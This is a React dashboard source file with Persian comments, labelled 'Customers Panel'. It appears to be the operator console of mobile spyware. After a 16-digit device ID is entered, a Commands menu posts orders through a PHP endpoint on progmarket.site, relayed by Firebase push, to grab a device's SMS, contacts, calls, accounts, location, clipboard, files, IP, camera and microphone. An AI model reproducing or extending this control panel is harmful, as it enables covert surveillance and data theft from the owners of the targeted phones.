import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { useQuery } from "@tanstack/react-query";
import {
  Search, Settings, LogOut, Command, Globe, Moon, Sun,
  Home, BarChart3, MessageCircle, BookUser, Phone, CreditCard, MapPin,
  Folder, ClipboardList, Camera, Mic, Download, Globe2
} from "lucide-react";
import { useTheme } from "@/context/theme-context";
import { useAuth } from "@/context/auth-context";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Accordion, AccordionItem, AccordionTrigger, AccordionContent } from "@/components/ui/accordion";
import CustomerInfoPanels from "@/components/CustomerInfoPanels";
import RecentCustomersList from "@/components/RecentCustomersList";
import CustomerStatistics from "@/components/CustomerStatistics";
import ServerSettings from "@/components/ServerSettings";
import { searchCustomerById } from "@/lib/api";
import type { Customer } from "@/lib/api";
import { supabase } from "@/lib/supabaseClient";

// تابع ارسال به PHP برای فایربیس
async function sendCommandToFirebase({ key1, key2, phoneiduser }) {
  try {
    console.log("در حال ارسال به PHP:", { key1, key2, phoneiduser });
    const res = await fetch("https://progmarket.site/uploads/send-command.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: key1,
        body: key2,
        phoneiduser,
      }),
    });

    const result = await res.json();
    console.log("پاسخ سرور:", result);

    if (res.ok && result.status === "sent") {
      alert("دستور ارسال شد.");
    } else {
      alert(
        "خطا در ارسال دستور: " +
          (result?.message || "مشکل در ارتباط با سرور یا داده ناقص است.")
      );
    }
  } catch (e) {
    alert("خطای شبکه!");
    console.error("Network error:", e);
  }
}

const MIN_ID_LENGTH = 16;

const Dashboard = () => {
  const { logout } = useAuth();
  const { theme, toggleTheme, language, toggleLanguage, t } = useTheme();
  const [searchId, setSearchId] = useState("");
  const [activeView, setActiveView] = useState<'dashboard' | 'statistics' | 'settings'>('dashboard');
  const [commandsOpen, setCommandsOpen] = useState(false);
  const [phoneiduser, setPhoneiduser] = useState(""); // شناسه مشتری

  const location = useLocation();
  const navigate = useNavigate();

  const queryParams = new URLSearchParams(location.search);
  const customerIdFromUrl = queryParams.get("customerId");

  useEffect(() => {
    if (customerIdFromUrl && customerIdFromUrl.length === MIN_ID_LENGTH) {
      setSearchId(customerIdFromUrl);
      setPhoneiduser(customerIdFromUrl); // فرض: شناسه مشتری همان customerId
      refetchCustomer();
      setActiveView('dashboard');
    }
    // eslint-disable-next-line
  }, [customerIdFromUrl]);

  const {
    data: searchedCustomer,
    refetch: refetchCustomer
  } = useQuery({
    queryKey: ["customer", searchId],
    queryFn: () => searchCustomerById(searchId),
    enabled: false,
  });

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (searchId.trim().length === MIN_ID_LENGTH) {
      navigate(`/dashboard?customerId=${searchId}`);
      setPhoneiduser(searchId);
      refetchCustomer();
      setActiveView('dashboard');
    } else {
      alert(`شناسه مشتری باید ${MIN_ID_LENGTH} رقم باشد.`);
    }
  };

  const sidebarBtnClass = "w-full flex items-center justify-start gap-2 px-3 py-2 rounded-md transition text-base font-normal hover:bg-muted/40";

  // لیست کامندها بدون کلید ثابت (کلیدها را موقع کلیک از سوپابیس می‌گیریم)
  const commands = [
    { id: 1, label: "State", icon: <BarChart3 className="h-5 w-5" /> },
    { id: 2, label: "Sms", icon: <MessageCircle className="h-5 w-5" /> },
    { id: 3, label: "Contacts", icon: <BookUser className="h-5 w-5" /> },
    { id: 4, label: "Calls", icon: <Phone className="h-5 w-5" /> },
    { id: 5, label: "Accounts", icon: <CreditCard className="h-5 w-5" /> },
    { id: 6, label: "Location", icon: <MapPin className="h-5 w-5" /> },
    { id: 7, label: "Folders", icon: <Folder className="h-5 w-5" /> },
    { id: 8, label: "Clipboards", icon: <ClipboardList className="h-5 w-5" /> },
    { id: 9, label: "IP", icon: <Globe2 className="h-5 w-5" /> },
    { id: 10, label: "Camera", icon: <Camera className="h-5 w-5" /> },
    { id: 11, label: "Microphone", icon: <Mic className="h-5 w-5" /> },
    { id: 12, label: "Download", icon: <Download className="h-5 w-5" /> },
  ];

  // تابع برای گرفتن کلید از سوپابیس و ارسال دستور
  async function handleCommandClick(label: string) {
    try {
      const { data, error } = await supabase
        .from("commands")
        .select("key1, key2")
        .eq("label", label)
        .single();

      if (error || !data) {
        alert("خطا در دریافت کلید این کامند!");
        return;
      }
      await sendCommandToFirebase({
        key1: data.key1,
        key2: data.key2,
        phoneiduser: phoneiduser || "no_user"
      });
    } catch (e) {
      alert("خطای شبکه یا پیکربندی سوپابیس!");
    }
  }

  return (
    <div className={`min-h-screen bg-dna-pattern bg-cover flex ${language === "fa" ? "font-vazir" : ""}`}
      dir={language === "fa" ? "rtl" : "ltr"}
    >
      {/* Left Sidebar */}
      <div className="w-64 h-screen bg-sidebar glass-morphism border-r border-border/50 flex flex-col">
        <div className="p-4 border-b border-border/50">
          <h1 className="text-xl font-bold cursor-pointer" onClick={() => setActiveView('dashboard')}>Customers Panel</h1>
        </div>
        <div className="flex-1 overflow-auto p-4">
          <nav className="space-y-2">
            <Button
              variant="ghost"
              className={`${sidebarBtnClass} ${activeView === "dashboard" ? "font-bold" : ""}`}
              onClick={() => setActiveView('dashboard')}
            >
              <Home className="h-5 w-5" />
              <span>Dashboard</span>
            </Button>
            {/* Commands Accordion */}
            <Accordion
              type="single"
              collapsible
              className="w-full"
              value={commandsOpen && searchedCustomer ? "commands" : undefined}
              onValueChange={val => setCommandsOpen(val === "commands")}
              disabled={!searchedCustomer}
            >
              <AccordionItem value="commands" className="border-b-0">
                <AccordionTrigger
                  className={`${sidebarBtnClass} ${commandsOpen ? "font-bold" : ""} ${!searchedCustomer ? "opacity-50 pointer-events-none" : ""}`}
                  style={{ fontWeight: commandsOpen ? "bold" : "normal" }}
                  onClick={() => {
                    if (searchedCustomer) setCommandsOpen(open => !open);
                  }}
                  disabled={!searchedCustomer}
                >
                  <Command className="h-5 w-5" />
                  <span>Commands</span>
                </AccordionTrigger>
                <AccordionContent>
                  <div className="py-1 pl-8 space-y-1">
                    {commands.map(cmd => (
                      <Button
                        key={cmd.id}
                        variant="ghost"
                        className="w-full flex items-center gap-2 justify-start text-sm"
                        onClick={() =>
                          handleCommandClick(cmd.label)
                        }
                      >
                        {cmd.icon}
                        <span>{cmd.label}</span>
                      </Button>
                    ))}
                  </div>
                </AccordionContent>
              </AccordionItem>
            </Accordion>
            <Button
              variant="ghost"
              className={`${sidebarBtnClass} ${activeView === "statistics" ? "font-bold" : ""}`}
              onClick={() => setActiveView('statistics')}
            >
              <BarChart3 className="h-5 w-5" />
              <span>Statistics</span>
            </Button>
            <Button
              variant="ghost"
              className={`${sidebarBtnClass} ${activeView === "settings" ? "font-bold" : ""}`}
              onClick={() => setActiveView('settings')}
            >
              <Settings className="h-5 w-5" />
              <span>Settings</span>
            </Button>
            <Button
              variant="ghost"
              className={sidebarBtnClass}
              onClick={logout}
            >
              <LogOut className="h-5 w-5" />
              <span>Logout</span>
            </Button>
          </nav>
        </div>
      </div>
      {/* Main Content */}
      <div className="flex-1 h-screen flex flex-col">
        {/* Top Navigation Bar */}
        <div className="h-14 bg-background/50 backdrop-blur-md border-b border-border/50 flex items-center justify-between px-4">
          <h2 className="text-lg font-semibold capitalize">
            {t(activeView)}
          </h2>
          <div className="flex items-center space-x-2">
            <Button variant="ghost" size="icon" onClick={toggleTheme}>
              {theme === "light" ? <Moon size={20} /> : <Sun size={20} />}
            </Button>
            <Button variant="ghost" size="icon" onClick={toggleLanguage}>
              <Globe size={20} />
            </Button>
          </div>
        </div>
        {/* Main Content Area */}
        <div className="flex-1 overflow-auto p-6">
          {activeView === 'dashboard' && (
            <>
              <div className="w-full max-w-xl mx-auto mb-8">
                <form onSubmit={handleSearch} className="flex space-x-2">
                  <Input
                    placeholder={t('searchCustomer')}
                    value={searchId}
                    onChange={(e) => setSearchId(e.target.value)}
                    className="flex-1"
                    maxLength={MIN_ID_LENGTH}
                  />
                  <Button type="submit">
                    <Search className="h-4 w-4 mr-2" />
                    {t('search')}
                  </Button>
                </form>
              </div>
              {searchedCustomer ? (
                <div className="max-w-7xl mx-auto">
                  <CustomerInfoPanels customer={searchedCustomer} />
                </div>
              ) : (
                <div className="max-w-7xl mx-auto">
                  <div className="text-center text-muted-foreground mt-24">
                    لطفا ابتدا یک مشتری را جستجو کنید
                  </div>
                </div>
              )}
            </>
          )}
          {activeView === 'settings' && (
            <div className="max-w-6xl mx-auto mb-6">
              <ServerSettings />
            </div>
          )}
          {activeView === 'statistics' && <CustomerStatistics />}
        </div>
      </div>
      {/* Right Sidebar */}
      <div className="w-64 h-screen bg-sidebar glass-morphism border-l border-border/50 flex flex-col">
        <div className="p-4 border-b border-border/50">
          <h3 className="font-semibold">{t('recentCustomers')}</h3>
        </div>
        <div className="flex-1 overflow-auto p-4">
          <RecentCustomersList />
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
